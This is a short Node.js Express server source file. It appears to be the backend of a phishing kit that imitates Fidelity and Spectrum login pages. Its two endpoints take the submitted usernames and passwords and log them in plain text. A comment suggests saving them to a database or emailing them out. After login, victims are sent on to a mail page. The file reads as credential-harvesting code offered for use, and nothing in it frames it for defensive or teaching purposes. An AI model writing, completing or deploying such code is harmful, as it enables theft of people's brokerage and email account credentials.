const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON request bodies
app.use(bodyParser.json());

// Serve static files for your HTML, CSS, JS, images, etc.
app.use(express.static(path.join(__dirname, "public"))); 
// Place your index.html, mail.html, and other static assets inside /public

// POST endpoint to handle Fidelity login form submission
app.post("/send-login", (req, res) => {
  const { username, password, remember } = req.body;

  // Log credentials - Replace this with your logic (e.g. DB save or email)
  console.log("Fidelity login data received:");
  console.log(`Username: ${username}`);
  console.log(`Password: ${password}`);
  console.log(`Remember Username: ${remember}`);

  res.status(200).json({ message: "Fidelity login received" });
});

// POST endpoint to handle Spectrum login form submission
app.post("/send-spectrum-login", (req, res) => {
  const { spectrumUsername, spectrumPassword, staySignedIn } = req.body;

  // Log credentials - Replace this with your logic
  console.log("Spectrum login data received:");
  console.log(`Spectrum Username: ${spectrumUsername}`);
  console.log(`Spectrum Password: ${spectrumPassword}`);
  console.log(`Stay Signed In: ${staySignedIn}`);

  res.status(200).json({ message: "Spectrum login received" });
});

// Serve index.html by default
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Serve mail.html when redirected after login
app.get("/mail.html", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "mail.html"));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
